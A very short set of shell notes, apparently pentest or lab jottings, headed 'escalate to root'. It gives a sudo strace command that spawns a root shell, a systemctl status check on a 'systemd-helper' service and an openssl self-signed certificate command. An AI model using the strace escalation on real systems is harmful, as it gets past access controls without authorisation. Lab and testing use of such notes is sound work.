escalate to root

`sudo strace -o /dev/null /bin/sh`

sudo systemctl status -l systemd-helper.service

openssl req -new -newkey rsa:2048 -days 365 -nodes -x509 -keyout server.key -out server.crt